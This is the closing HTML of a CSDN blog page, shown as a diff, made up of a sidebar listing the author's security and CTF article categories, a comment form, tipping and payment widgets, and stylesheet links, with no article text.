+           </div> 
+          </div> <p class="desc" title="中职网络安全赛题思路解析">中职网络安全赛题思路解析</p> </a> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+     <div id="recommend-right"> 
+      <div class="flex-column aside-box groupfile" id="groupfile"> 
+       <div class="groupfile-div"> 
+        <h3 class="aside-title">目录</h3> 
+        <div class="align-items-stretch group_item"> 
+         <div class="pos-box"> 
+          <div class="scroll-box"> 
+           <div class="toc-box"></div> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+      <div class="aside-box kind_person d-flex flex-column"> 
+       <h3 class="aside-title">分类专栏</h3> 
+       <div class="align-items-stretch kindof_item" id="kind_person_column"> 
+        <div class="aside-content"> 
+         <ul> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_12601202.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_12601202.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 数据网 </span> </a> <span class="special-column-num">1篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11321741.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11321741.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756754.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 渗透测试 </span> </a> <span class="special-column-num">22篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11860031.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11860031.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 沙盒逃逸 </span> </a> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11333676.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11333676.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756757.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_代码审计 </span> </a> <span class="special-column-num">6篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11413976.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11413976.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_流量日志分析 </span> </a> <span class="special-column-num">4篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11787938.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11787938.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_秘钥问题 </span> </a> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11349192.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11349192.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 环境问题处理 </span> </a> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11668478.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11668478.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> python爬虫 </span> </a> <span class="special-column-num">2篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11345954.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11345954.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 逆向工程 </span> </a> <span class="special-column-num">2篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11624235.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11624235.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756780.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> RPA学习 </span> </a> <span class="special-column-num">1篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11604416.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11604416.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 交换机配置 </span> </a> <span class="special-column-num">1篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319890.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319890.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 反序列化 </span> </a> <span class="special-column-num">4篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11414089.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11414089.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756916.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_现代密码学 </span> </a> <span class="special-column-num">1篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11407652.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11407652.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756923.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_COOKIE注入 </span> </a> <span class="special-column-num">1篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11349237.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11349237.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_XXE漏洞 </span> </a> <span class="special-column-num">2篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11337524.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11337524.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756923.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> rsa </span> </a> <span class="special-column-num">10篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11323613.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11323613.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756754.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> DC系列靶场 </span> </a> <span class="special-column-num">8篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319903.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319903.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> 漏洞复现 </span> </a> <span class="special-column-num">11篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319638.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319638.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756926.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> CTF_文件上传 </span> </a> <span class="special-column-num">11篇</span> </li> 
+          <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319906.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319906.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+            <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class=""> apache </span> </a> </li> 
+         </ul> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+    </aside> 
+   </div> 
+   <div class="recommend-right1  align-items-stretch clearfix" id="rightAsideConcision" data-type="recommend"> 
+    <aside class="recommend-right_aside"> 
+     <div id="recommend-right-concision"> 
+      <div class="flex-column aside-box groupfile" id="groupfileConcision"> 
+       <div class="groupfile-div1"> 
+        <h3 class="aside-title">目录</h3> 
+        <div class="align-items-stretch group_item"> 
+         <div class="pos-box"> 
+          <div class="scroll-box"> 
+           <div class="toc-box"></div> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+    </aside> 
+   </div> 
+  </div> 
+  <div class="mask-dark"></div> 
+  <div class="skin-boxshadow"></div> 
+  <div class="directory-boxshadow"></div> 
+  <div class="comment-side-box-shadow comment-side-tit-close" id="commentSideBoxshadow"> 
+   <div class="comment-side-content"> 
+    <div class="comment-side-tit"> 
+     <div class="comment-side-tit-count">
+      评论&nbsp;
+      <span class="count">8</span>
+     </div> 
+     <img class="comment-side-tit-close" src="https://csdnimg.cn/release/blogv2/dist/pc/img/closeBt.png">
+    </div> 
+    <div id="pcCommentSideBox" class="comment-box comment-box-new2 " style="display:block"> 
+     <div class="comment-edit-box d-flex"> 
+      <div class="user-img"> 
+       <a href="https://blog.csdn.net/2401_86326933" target="_blank"> <img src="https://profile-avatar.csdnimg.cn/612d625e03cf497a8b295d617cad0cf2_2401_86326933.jpg!1"> </a> 
+      </div> 
+      <form id="commentform"> 
+       <textarea class="comment-content" name="comment_content" id="comment_content" placeholder="欢迎高质量的评论，低质的评论会被折叠" maxlength="1000"></textarea> 
+       <div class="comment-reward-box" style="background-image: url('https://img-home.csdnimg.cn/images/20230131025301.png');"> 
+        <a class="btn-remove-reward"></a> 
+        <div class="form-reward-box"> 
+         <div class="info">
+           成就一亿技术人! 
+         </div> 
+         <div class="price-info">
+           拼手气红包
+          <span class="price">6.0元</span> 
+         </div> 
+        </div> 
+       </div> 
+       <div class="comment-operate-box"> 
+        <div class="comment-operate-l"> 
+         <span id="tip_comment" class="tip">还能输入<em>1000</em>个字符</span> 
+        </div> 
+        <div class="comment-operate-c">
+          &nbsp; 
+        </div> 
+        <div class="comment-operate-r"> 
+         <div class="comment-operate-item comment-reward"> 
+          <img class="comment-operate-img" data-url="https://csdnimg.cn/release/blogv2/dist/pc/img/" src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentReward.png" alt="红包"> 
+          <span class="comment-operate-tip">添加红包</span> 
+         </div> 
+         <div class="comment-operate-item comment-emoticon"> 
+          <img class="comment-operate-img" data-url="https://csdnimg.cn/release/blogv2/dist/pc/img/" src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentEmotionIcon.png" alt="表情包"> 
+          <span class="comment-operate-tip">插入表情</span> 
+          <div class="comment-emoticon-box comment-operate-isshow"> 
+           <div class="comment-emoticon-img-box"></div> 
+          </div> 
+         </div> 
+         <div class="comment-operate-item comment-code"> 
+          <img class="comment-operate-img" data-url="https://csdnimg.cn/release/blogv2/dist/pc/img/" src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentCodeIcon.png" alt="表情包"> 
+          <span class="comment-operate-tip">代码片</span> 
+          <div class="comment-code-box comment-operate-isshow"> 
+           <ul id="commentCode"> 
+            <li><a data-code="html">HTML/XML</a></li> 
+            <li><a data-code="objc">objective-c</a></li> 
+            <li><a data-code="ruby">Ruby</a></li> 
+            <li><a data-code="php">PHP</a></li> 
+            <li><a data-code="csharp">C</a></li> 
+            <li><a data-code="cpp">C++</a></li> 
+            <li><a data-code="javascript">JavaScript</a></li> 
+            <li><a data-code="python">Python</a></li> 
+            <li><a data-code="java">Java</a></li> 
+            <li><a data-code="css">CSS</a></li> 
+            <li><a data-code="sql">SQL</a></li> 
+            <li><a data-code="plain">其它</a></li> 
+           </ul> 
+          </div> 
+         </div> 
+         <div class="comment-operate-item"> 
+          <input type="hidden" id="comment_replyId" name="comment_replyId"> 
+          <input type="hidden" id="article_id" name="article_id" value="120009530"> 
+          <input type="hidden" id="comment_userId" name="comment_userId" value=""> 
+          <input type="hidden" id="commentId" name="commentId" value=""> 
+          <a data-report-click="{&quot;mod&quot;:&quot;1582594662_003&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4227&quot;,&quot;ab&quot;:&quot;new&quot;}"> <input type="submit" class="btn-comment btn-comment-input" value="评论"> </a> 
+         </div> 
+        </div> 
+       </div> 
+      </form> 
+     </div> 
+     <div class="comment-list-container"> 
+      <div class="comment-list-box comment-operate-item"> 
+      </div> 
+      <div id="lookGoodComment" class="look-good-comment side-look-comment"> 
+       <a class="look-more-comment">查看更多评论<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowDownWhite.png" alt=""></a> 
+      </div> 
+      <div id="lookFlodComment" class="look-flod-comment"> 
+       <span class="count"></span>&nbsp;条评论被折叠&nbsp;
+       <a class="look-more-flodcomment">查看</a> 
+      </div> 
+      <div class="opt-box text-center"> 
+       <div class="btn btn-sm btn-link-blue" id="btnMoreComment"></div> 
+      </div> 
+     </div> 
+    </div> 
+    <div id="pcFlodCommentSideBox" class="pc-flodcomment-sidebox"> 
+     <div class="comment-fold-tit">
+      <span id="lookUnFlodComment" class="back"><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowLeftWhite.png" alt=""></span>被折叠的&nbsp;
+      <span class="count"></span>&nbsp;条评论 
+      <a href="https://blogdev.blog.csdn.net/article/details/122245662" class="tip" target="_blank">为什么被折叠?</a> 
+      <a href="https://bbs.csdn.net/forums/FreeZone" class="park" target="_blank"> <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/iconPark.png">到【灌水乐园】发言</a> 
+     </div> 
+     <div class="comment-fold-content"></div> 
+     <div id="lookBadComment" class="look-bad-comment side-look-comment"> 
+      <a class="look-more-comment">查看更多评论<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowDownWhite.png" alt=""></a> 
+     </div> 
+    </div> 
+   </div> 
+   <div class="comment-rewarddialog-box"> 
+    <div class="form-box"> 
+     <div class="title-box">
+       添加红包 
+      <a class="btn-form-close"></a> 
+     </div> 
+     <form id="commentRewardForm"> 
+      <div class="ipt-box"> 
+       <label for="txtName">祝福语</label> 
+       <div class="ipt-btn-box"> 
+        <input type="text" name="name" id="txtName" autocomplete="off" maxlength="50"> 
+        <a class="btn-ipt btn-random"></a> 
+       </div> 
+       <p class="notice">请填写红包祝福语或标题</p> 
+      </div> 
+      <div class="ipt-box"> 
+       <label for="txtSendAmount">红包数量</label> 
+       <div class="ipt-txt-box"> 
+        <input type="text" name="sendAmount" maxlength="4" id="txtSendAmount" placeholder="请填写红包数量(最小10个)" autocomplete="off"> 
+        <span class="after-txt">个</span> 
+       </div> 
+       <p class="notice">红包个数最小为10个</p> 
+      </div> 
+      <div class="ipt-box"> 
+       <label for="txtMoney">红包总金额</label> 
+       <div class="ipt-txt-box error"> 
+        <input type="text" name="money" maxlength="5" id="txtMoney" placeholder="请填写总金额(最低5元)" autocomplete="off"> 
+        <span class="after-txt">元</span> 
+       </div> 
+       <p class="notice">红包金额最低5元</p> 
+      </div> 
+      <div class="balance-info-box"> 
+       <label>余额支付</label> 
+       <div class="balance-info">
+         当前余额
+        <span class="balance">3.43</span>元 
+        <a href="https://i.csdn.net/#/wallet/balance/recharge" class="link-charge" target="_blank">前往充值 &gt;</a> 
+       </div> 
+      </div> 
+      <div class="opt-box"> 
+       <div class="pay-info">
+         需支付：
+        <span class="price">10.00</span>元 
+       </div> 
+       <button type="button" class="ml-auto btn-cancel">取消</button> 
+       <button type="button" class="ml8 btn-submit" disabled="true">确定</button> 
+      </div> 
+     </form> 
+    </div> 
+   </div> 
+   <div class="rr-guide-box"> 
+    <div class="rr-first-box"> 
+     <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward02.png" alt=""> 
+     <button class="btn-guide-known next">下一步</button> 
+    </div> 
+    <div class="rr-second-box"> 
+     <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward03.png" alt=""> 
+     <button class="btn-guide-known known">知道了</button> 
+    </div> 
+   </div> 
+  </div> 
+  <div class="redEnvolope" id="redEnvolope"> 
+   <div class="env-box"> 
+    <div class="env-container"> 
+     <div class="pre-open" id="preOpen"> 
+      <div class="top"> 
+       <header> 
+        <img class="clearTpaErr" :src="redpacketAuthor.avatar" alt=""> 
+        <div class="author">
+         成就一亿技术人!
+        </div> 
+       </header> 
+       <div class="bot-icon"></div> 
+      </div> 
+      <footer> 
+       <div class="red-openbtn open-start"></div> 
+       <div class="tip">
+         领取后你会自动成为博主和红包主的粉丝 
+        <a class="rule" target="_blank">规则</a> 
+       </div> 
+      </footer> 
+     </div> 
+     <div class="opened" id="opened"> 
+      <div class="bot-icon"> 
+       <header> 
+        <a class="creatorUrl" href="" target="_blank"> <img class="clearTpaErr" src="https://profile-avatar.csdnimg.cn/default.jpg!2" alt=""> </a> 
+        <div class="author"> 
+         <div class="tt">
+          hope_wisdom
+         </div> 发出的红包 
+        </div> 
+       </header> 
+      </div> 
+      <div class="receive-box"> 
+       <header></header> 
+       <div class="receive-list"> 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+    <div class="close-btn"></div> 
+   </div> 
+  </div> 
+  <div class="pay-code"> 
+   <div class="pay-money">
+    实付
+    <span class="pay-money-span" data-nowprice="" data-oldprice="">元</span>
+   </div> 
+   <div class="content-blance">
+    <a class="blance-bt" href="javascript:;">使用余额支付</a>
+   </div> 
+   <div class="content-code"> 
+    <div id="payCode" data-id=""> 
+     <div class="renovate"> 
+      <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/pay-time-out.png"> 
+      <span>点击重新获取</span> 
+     </div> 
+    </div> 
+    <div class="pay-style">
+     <span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/weixin.png"></span>
+     <span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/zhifubao.png"></span>
+     <span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/jingdong.png"></span>
+     <span class="text">扫码支付</span>
+    </div> 
+   </div> 
+   <div class="bt-close"> 
+    <svg t="1567152543821" class="icon" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10924" xmlns:xlink="http://www.w3.org/1999/xlink" width="12" height="12"> 
+     <defs> 
+      <style type="text/css"></style> 
+     </defs> 
+     <path d="M512 438.378667L806.506667 143.893333a52.032 52.032 0 1 1 73.6 73.621334L585.621333 512l294.485334 294.485333a52.074667 52.074667 0 0 1-73.6 73.642667L512 585.621333 217.514667 880.128a52.053333 52.053333 0 1 1-73.621334-73.642667L438.378667 512 143.893333 217.514667a52.053333 52.053333 0 1 1 73.621334-73.621334L512 438.378667z" fill="" p-id="10925"></path> 
+    </svg> 
+   </div> 
+   <div class="pay-balance"> 
+    <input type="radio" class="pay-code-radio" data-type="details"> 
+    <span class="span">钱包余额</span> 
+    <span class="balance" style="color:#FC5531;font-size:14px;">0</span> 
+    <div class="pay-code-tile"> 
+     <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/pay-help.png" alt=""> 
+     <div class="pay-code-content"> 
+      <div class="span"> 
+       <p class="title">抵扣说明：</p> 
+       <p> 1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。<br> 2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。</p> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+   <a class="pay-balance-con" href="https://i.csdn.net/#/wallet/balance/recharge" target="_blank"><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/recharge.png" alt=""><span>余额充值</span></a> 
+  </div> 
+  <div style="display:none;"> 
+   <img src="" onerror="setTimeout(function(){if(!/(csdn.net|iteye.com|baiducontent.com|googleusercontent.com|360webcache.com|sogoucdn.com|bingj.com|baidu.com)$/.test(window.location.hostname)){var test=&quot;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x73\x64\x6e\x2e\x6e\x65\x74&quot;}},3000);"> 
+  </div> 
+  <div class="keyword-dec-box" id="keywordDecBox"></div>  
+  <!-- 富文本柱状图  --> 
+  <link rel="stylesheet" href="https://csdnimg.cn/release/blog_editor_html/release1.6.12/ckeditor/plugins/chart/chart.css">        
+  <link rel="stylesheet" href="https://g.csdnimg.cn/lib/cboxEditor/1.1.6/embed-editor.min.css"> 
+  <link rel="stylesheet" href="https://csdnimg.cn/release/blog_editor_html/release1.6.12/ckeditor/plugins/codesnippet/lib/highlight/styles/atom-one-dark.css">                  
+ </body>
+</html>
